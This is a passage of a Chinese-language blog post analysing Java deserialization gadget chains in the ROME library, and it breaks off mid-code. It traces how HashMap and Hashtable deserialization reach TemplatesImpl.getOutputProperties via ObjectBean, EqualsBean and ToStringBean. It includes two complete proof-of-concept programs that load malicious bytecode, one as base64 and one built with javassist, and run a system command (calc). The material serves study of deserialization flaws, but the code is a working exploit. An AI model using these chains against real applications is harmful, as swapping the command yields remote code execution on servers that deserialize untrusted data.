DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">                                    NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">                                        NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">                                            TemplatesImpl.getOutputProperties() <span class="comment">// 一下就是CB1的链子了</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="敏感点-ToStringBean-toString-String"><a href="#敏感点-ToStringBean-toString-String" class="headerlink" title="敏感点: ToStringBean.toString(String)"></a>敏感点: ToStringBean.toString(String)</h3><ol><li><p>来到<code>ToStringBean.toString(String)</code>，可以看到这里有无参getter的调用</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;pds.length;i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod!=<span class="literal">null</span> &amp;&amp;                             <span class="comment">// ensure it has a getter method</span></span><br><span class="line">                    pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; <span class="comment">// filter Object.class getter methods</span></span><br><span class="line">                    pReadMethod.getParameterTypes().length==<span class="number">0</span>) &#123;     <span class="comment">// filter getter methods that take parameters</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(_obj,NO_PARAMS);</span><br><span class="line">                    printProperty(sb,prefix+<span class="string">&quot;.&quot;</span>+pName,value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span>+_obj.getClass()+<span class="string">&quot;.toString(): &quot;</span>+ex.getMessage()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>查查当前文件有无调用这个toString()的，有！接下来该文件中没有调用toString()的了，那就找一个可以设置是ToStringBean的对象调用toString()？<strong>将问题进一步转化</strong></p></li></ol><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><ol><li><p>观察这个类先，内部还包含了3个bean</p><ol><li>再注意到hashCode()方法</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Cloneable &#123;</span><br><span class="line">    <span class="keyword">private</span> EqualsBean _equalsBean;</span><br><span class="line">    <span class="keyword">private</span> ToStringBean _toStringBean;</span><br><span class="line">    <span class="keyword">private</span> CloneableBean _cloneableBean;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>进入到EqualsBean.beanHashCode()方法</p><ol><li>这里看到有一个toString()，并且_obj可控（反射），符合和上述的要求</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] NO_PARAMS = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Class _beanClass;</span><br><span class="line">    <span class="keyword">private</span> Object _obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _obj.toString().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="HashMap-poc"><a href="#HashMap-poc" class="headerlink" title="HashMap poc"></a>HashMap poc</h3><ol><li>先要解决构造条件: 先过一遍再开始细，有些有呼应<ol><li>HashMap中放入一个ObejectBean</li><li>ObejectBean中的_equalsBean(是一个EqualsBean)，的EqualsBean的_obj设置为ToStringBean(这里hashCode调用_obj.toString())</li><li>将ToString对象的_obj的_beanClass设置为Templates.class(会获取其中的getOutput…敏感方法)</li><li>最后将ToString对象的_obj设置为我们恶意的TemplatesImpl对象就好了</li></ol></li><li>romePox<ol><li>这里想用javassist发现用的是jdk7u21就直接base64了</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// romePoc.java</span></span><br><span class="line"><span class="keyword">package</span> rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="comment">// import javassist.ClassPool;</span></span><br><span class="line"><span class="comment">// import javassist.CtClass;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">romePoc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. 恶意TemplatesImpl对象 * * * * * */</span></span><br><span class="line">            <span class="comment">// ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line">            <span class="comment">// CtClass clazz_evil = pool.get(Evil.class.getName());</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">payload_obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            <span class="comment">// setFieldValue(payload_obj, &quot;_bytecodes&quot;, clazz_evil.toBytecode());</span></span><br><span class="line">            <span class="comment">// javac Evil.java &amp;&amp; cat Evil.class | base64 -w 0</span></span><br><span class="line">            setFieldValue(payload_obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123; Base64.decode(<span class="string">&quot;yv66vgAAADMALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY2&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;9tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGF&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;jaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAARABIHACQMACUAJgEAEUhl&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;bGxvIGZyb20gS0MxenM0BwAnDAAoACkHACoMACsALAEABGNhbGMMAC0ALgEACXJvbWUvRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyY&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;WN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQ&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;EAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXR&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;SdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACQAAAAAAAwABAAoACwACAAwAAAAZAAAAAwAA&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;AAGxAAAAAQANAAAABgABAAAADAAOAAAABAABAA8AAQAKABAAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAAA4ADgAAAAQAAQAPAAEAEQASAAIADAAAADoAAgABAAAAFiq3AAGyAAISA7YABLgABRIGtgAHV7EAAAABAA0AAAASAAQAAAARAAQAEgAMABMAFQAUAA4AAAAEAAEAEwABABQAAAACABU=&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(payload_obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;KC1zs4&quot;</span>);</span><br><span class="line">            setFieldValue(payload_obj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 设置触发 * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">triggeredObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">place_holder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;KC1zs4&quot;</span>); <span class="comment">// 使用反射进行设置</span></span><br><span class="line">            <span class="type">ObjectBean</span> <span class="variable">obj_ObjectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, place_holder);</span><br><span class="line">            triggeredObj.put(obj_ObjectBean,<span class="string">&quot;KC1zs4&quot;</span>);</span><br><span class="line">            setFieldValue(obj_ObjectBean, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, payload_obj)));</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(triggeredObj);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本地测试触发</span></span><br><span class="line">            System.out.println(baos);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h2><h3 id="HashTable-Gadget-CC7-但是不用CC库"><a href="#HashTable-Gadget-CC7-但是不用CC库" class="headerlink" title="HashTable Gadget: CC7 + ?(但是不用CC库)"></a>HashTable Gadget: CC7 + ?(但是不用CC库)</h3><ol><li>触发点sink其实也是一样的，通过hash()来触发到ObjectBean.hashCode()，只不过这里使用的是HashTable</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject(ObjectInputStream)</span><br><span class="line">HashTable.reconstitutionPut()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><h3 id="HashTable-reconstitutionPut"><a href="#HashTable-reconstitutionPut" class="headerlink" title="HashTable.reconstitutionPut()"></a>HashTable.reconstitutionPut()</h3><ol><li><p>查看源码可以知道Hashtable再readObject中会调用<code>reconsititutuionPut(..)</code>，在其中会调用到hash()再到obj.hashCode()</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">    <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="Hashtable-poc"><a href="#Hashtable-poc" class="headerlink" title="Hashtable poc"></a>Hashtable poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashTableExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);  <span class="comment">// 直接创建恶意类</span></span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br><span class="line">        <span class="comment">// 创建ObjectBean对象</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        setFiled(objectBean,<span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFiled(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashTable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;HashTable.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;HashTable.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h2><h3 id="Gadget-没有ObjectBean了-体量小一点"><a href="#Gadget-没有ObjectBean了-体量小一点" class="headerlink" title="Gadget: 没有ObjectBean了(体量小一点)"></a>Gadget: 没有ObjectBean了(体量小一点)</h3><blockquote><p>就先不放exp了，最后CC链总结的时候会给出片段，然后可以直接获取这样<br>已经变成裁缝了(</p></blockquote><ol><li><p>链子如下</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 复现版本 jdk8u66 // jdk7u21中的BadAttr..没有对应的readObject()</span></span><br><span 